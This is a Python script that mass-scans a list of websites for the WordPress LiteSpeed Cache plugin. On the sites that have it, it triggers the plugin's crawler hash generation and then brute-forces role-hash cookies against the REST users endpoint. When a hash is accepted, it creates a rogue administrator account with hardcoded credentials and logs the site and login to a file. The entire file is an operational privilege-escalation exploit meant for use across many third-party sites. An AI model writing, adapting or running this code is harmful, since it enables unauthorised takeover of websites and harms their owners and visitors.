import requests
import random
import string
import time
import concurrent.futures
import os
from urllib.parse import urljoin

# Configuration
num_workers = 100              # Threads for scanning and exploitation
num_hash_attempts = 100        # Number of hash attempts per site
request_delay = 2              # Delay between requests in seconds
new_username = 'rajon'
new_user_password = 'rajon00998'
site_list_file = "listsite.txt"    # File with target site URLs
vuln_file = "vuln.txt"               # File to store sites with LiteSpeed Cache plugin installed
login_file = "login.txt"             # File to store successful login details
processed_file = "processed.txt"     # File to track exploited (processed) vulnerable sites
litespeed_path = "/wp-content/plugins/litespeed-cache/readme.txt"  # Path to plugin readme.txt

# User-Agent headers (as required)
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

def generate_random_string(length=6):
    """Generates a random alphanumeric string."""
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))

def check_litespeed_installed(target_url):
    """
    Checks if the LiteSpeed Cache plugin is installed by attempting to fetch its readme.txt.
    Returns True if the file is found (HTTP 200), False otherwise.
    """
    url = urljoin(target_url, litespeed_path)
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f"[FOUND] LiteSpeed Cache plugin installed on {target_url}")
            return True
        else:
            print(f"[NOT FOUND] {target_url} returned status {response.status_code} for readme.txt")
            return False
    except requests.RequestException as e:
        print(f"[ERROR] Request error for {target_url}: {e}")
        return False

def save_vulnerable_site(target_url):
    """
    Saves a vulnerable site URL to vuln.txt, ensuring it starts with 'http://'.
    Appends to vuln.txt without clearing existing data.
    """
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url
    with open(vuln_file, "a") as f:
        f.write(target_url + "\n")

def mark_site_processed(site_url):
    """Appends a processed site URL to processed.txt."""
    if not site_url.startswith("http://") and not site_url.startswith("https://"):
        site_url = "http://" + site_url
    with open(processed_file, "a") as f:
        f.write(site_url + "\n")

def get_new_vulnerable_sites():
    """
    Reads vuln.txt and processed.txt to return a list of sites that are in vuln.txt but not in processed.txt.
    """
    if not os.path.exists(vuln_file):
        return []
    with open(vuln_file, "r") as f:
        vuln_sites = set(line.strip() for line in f if line.strip())
    if os.path.exists(processed_file):
        with open(processed_file, "r") as f:
            processed_sites = set(line.strip() for line in f if line.strip())
    else:
        processed_sites = set()
    # Return only sites not yet processed
    new_sites = list(vuln_sites - processed_sites)
    return new_sites

def save_login(target_url, username, password):
    """
    Saves successful login details to login.txt in the format:
    http://site/wp-login.php#username@password
    """
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "http://" + target_url
    login_url = f"{target_url}/wp-login.php#{username}@{password}"
    with open(login_file, "a") as f:
        f.write(login_url + "\n")

def trigger_hash_generation(target_url):
    """
    Triggers LiteSpeed Cache hash generation via an AJAX request.
    """
    ajax_endpoint = "/wp-admin/admin-ajax.php"
    url = urljoin(target_url, ajax_endpoint)
    payload = {'action': 'async_litespeed', 'litespeed_type': 'crawler'}
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            print(f"[INFO] Triggered hash generation on {target_url}")
        else:
            print(f"[ERROR] Failed to trigger hash generation on {target_url} - Status: {response.status_code}")
    except requests.RequestException as e:
        print(f"[ERROR] AJAX request error on {target_url}: {e}")
    time.sleep(request_delay)

def attempt_hash(target_url, hash_value):
    """
    Attempts to authenticate using a generated hash.
    The hash is sent as a cookie along with litespeed_role='1'.
    """
    users_endpoint = "/wp-json/wp/v2/users"
    url = urljoin(target_url, users_endpoint)
    cookies = {'litespeed_hash': hash_value, 'litespeed_role': '1'}
    try:
        response = requests.post(url, cookies=cookies, headers=headers, timeout=10)
        return response, cookies
    except requests.RequestException as e:
        print(f"[ERROR] Request error on {target_url}: {e}")
        return None, None

def create_admin_user(target_url, cookies):
    """
    Attempts to create a new administrator user on the target site.
    If successful (HTTP 201), saves the login details to login.txt.
    """
    users_endpoint = "/wp-json/wp/v2/users"
    url = urljoin(target_url, users_endpoint)
    user_data = {
        'username': new_username,
        'password': new_user_password,
        'email': f"{new_username}@example.com",
        'roles': ['administrator']
    }
    try:
        response = requests.post(url, cookies=cookies, json=user_data, headers=headers, timeout=10)
        if response.status_code == 201:
            print(f"[SUCCESS] New admin user '{new_username}' created on {target_url}")
            save_login(target_url, new_username, new_user_password)
        else:
            print(f"[ERROR] Failed to create admin user on {target_url} - Status: {response.status_code} - Response: {response.text}")
    except requests.RequestException as e:
        print(f"[ERROR] Admin creation error on {target_url}: {e}")

def worker(target_url):
    """
    For a given vulnerable target, performs num_hash_attempts hash attempts.
    If a valid hash is found (status code 201), creates the admin user.
    """
    for _ in range(num_hash_attempts):
        hash_value = generate_random_string(6)
        print(f"[DEBUG] Trying hash: {hash_value} on {target_url}")
        response, cookies = attempt_hash(target_url, hash_value)
        if response is None:
            continue
        print(f"[DEBUG] Response status code: {response.status_code}")
        print(f"[DEBUG] Response content: {response.text}")
        if response.status_code == 201:
            print(f"[SUCCESS] Valid hash found on {target_url}: {hash_value}")
            create_admin_user(target_url, cookies)
            return
        time.sleep(request_delay)

def scan_site(target_url):
    """
    Scans a site to check if the LiteSpeed Cache plugin is installed.
    If so, appends the site (with http://) to vuln.txt.
    """
    print(f"[INFO] Scanning {target_url}")
    if check_litespeed_installed(target_url):
        save_vulnerable_site(target_url)

def process_vulnerable_sites():
    """
    Processes new vulnerable sites (from vuln.txt that have not yet been processed).
    Uses 100 threads to trigger hash generation and attempt exploitation on each site.
    After processing, marks the site as processed.
    """
    new_sites = get_new_vulnerable_sites()
    if not new_sites:
        print("[INFO] No new vulnerable sites to process.")
        return
    print(f"[INFO] Processing {len(new_sites)} new vulnerable sites...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        # First, trigger hash generation on all new sites
        executor.map(trigger_hash_generation, new_sites)
        # Then, attempt exploitation on all new sites
        executor.map(worker, new_sites)
    # Mark all processed sites
    for site in new_sites:
        mark_site_processed(site)

def scan_all_sites():
    """
    Reads target sites from listsite.txt and scans them.
    Only sites that have the LiteSpeed Cache plugin installed are saved to vuln.txt.
    The script will process sites in batches until it has scanned 500 sites (or all sites).
    """
    try:
        with open(site_list_file, "r") as f:
            all_sites = [line.strip() for line in f if line.strip()]
        if not all_sites:
            print("[ERROR] No valid targets found in listsite.txt")
            return
        # Process only the first 500 sites (or all if less than 500)
        sites_to_scan = all_sites[:500]
        print(f"[INFO] Scanning {len(sites_to_scan)} sites for LiteSpeed Cache plugin...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
            executor.map(scan_site, sites_to_scan)
    except FileNotFoundError:
        print("[ERROR] listsite.txt not found!")

def main():
    """
    Main process:
      1. Scans target sites (up to 500) for LiteSpeed Cache installation and writes vulnerable sites to vuln.txt.
      2. Processes new vulnerable sites from vuln.txt (in batches of 100 threads) to attempt admin creation.
      3. Does not clear vuln.txt; old data is kept.
      4. When new vulnerable sites are added later, they will be processed as well.
    """
    scan_all_sites()
    process_vulnerable_sites()

if __name__ == '__main__':
    main()
